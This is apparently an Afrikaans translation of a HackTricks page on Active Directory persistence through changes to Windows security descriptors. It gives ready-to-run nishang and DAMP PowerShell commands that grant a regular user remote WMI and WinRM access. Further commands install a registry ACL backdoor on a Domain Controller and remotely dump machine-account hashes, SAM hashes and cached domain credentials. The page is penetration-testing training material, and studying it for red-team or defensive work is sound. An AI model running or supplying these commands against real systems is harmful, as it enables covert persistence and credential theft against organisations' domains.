# Sekuriteitsbeskrywings

{{#include ../../banners/hacktricks-training.md}}

## Sekuriteitsbeskrywings

[Volgens die dokumentasie](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) definieer die formaat wat gebruik word om ’n sekuriteitsbeskrywing te beskryf. SDDL gebruik ACE-stringe vir DACL en SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

Die **sekuriteitsbeskrywings** word gebruik om die **toestemmings** wat ’n **objek** **oor** ’n **objek** het, te **stoor**. As jy net ’n **klein verandering** aan die **sekuriteitsbeskrywing** van ’n objek kan **maak**, kan jy baie interessante voorregte oor daardie objek verkry sonder dat jy ’n lid van ’n bevoorregte groep hoef te wees.

Hierdie persistence-tegniek is dus gebaseer op die vermoë om elke nodige voorreg teenoor sekere objekte te verkry, sodat jy ’n taak kan uitvoer wat gewoonlik admin-voorregte vereis, maar sonder dat jy ’n admin hoef te wees.

### Toegang tot WMI

Jy kan ’n gebruiker toegang gee om **WMI op afstand uit te voer** [**deur dit te gebruik**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Toegang tot WinRM

Gee toegang tot **winrm PS console aan ’n gebruiker** [**deur dit te gebruik**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Afstandstoegang tot hashes

Kry toegang tot die **registry** en **dump hashes** deur ’n **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)** te skep,** sodat jy enige tyd die **hash van die rekenaar**, die **SAM** en enige **cached AD**-geloofsbriewe op die rekenaar kan herwin. Dit is dus baie nuttig om hierdie toestemming aan ’n **regular user** teenoor ’n **Domain Controller**-rekenaar te gee:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Sien [**Silver Tickets**](silver-ticket.md) om te leer hoe jy die hash van die rekenaarrekening van 'n Domain Controller kan gebruik.

## Verwysings

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
